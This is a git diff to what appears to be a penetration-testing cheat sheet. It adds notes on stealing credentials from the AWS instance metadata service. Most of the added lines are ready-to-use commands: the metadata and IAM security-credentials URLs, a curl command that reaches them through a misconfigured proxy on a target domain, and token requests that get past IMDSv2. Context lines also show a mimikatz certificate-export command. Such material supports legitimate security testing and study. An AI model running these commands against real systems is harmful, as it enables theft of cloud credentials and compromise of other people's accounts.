@@ -60,7 +60,27 @@ mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
 - Server compromise or SSRF vulnerabilities might allow remote attackers to reach it.
 - IAM credentials can be stored here ```http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>```
 - New version requeres token, a put request is send and then responded to with a token. Then that token can be used to query data
+
+#### Instance Metadata Service URL
 ```
+http://169.254.169.254/latest/meta-data
+```
+
+#### Additional IAM creds possibly available here
+
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
+```
+
+- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured
+
+```bash
+curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
+```
+
+#### IMDS Version 2 has some protections 
+- but these commands can be used to access it
+```bash
 TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
 curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
 ```
